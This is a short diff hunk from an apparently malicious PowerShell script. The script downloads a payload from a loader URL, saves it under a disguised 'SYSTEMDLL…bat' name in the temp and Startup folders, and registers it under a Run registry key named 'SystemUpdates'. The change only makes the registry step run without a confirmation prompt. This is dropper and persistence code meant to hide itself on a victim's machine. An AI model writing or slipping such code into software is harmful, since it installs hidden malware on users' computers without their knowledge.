@@ -46,7 +46,7 @@ try{
     $dll = "SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat"
     $wc.DownloadFile("$loader","$tem\$dll");
     $wc.DownloadFile("$loader","$startUpFolder\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat");
-    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v SystemUpdates /t REG_SZ /d "$tem\$dll"
+    echo Y | reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v SystemUpdates /t REG_SZ /d "$tem\$dll"
 }
 catch {
     Continue
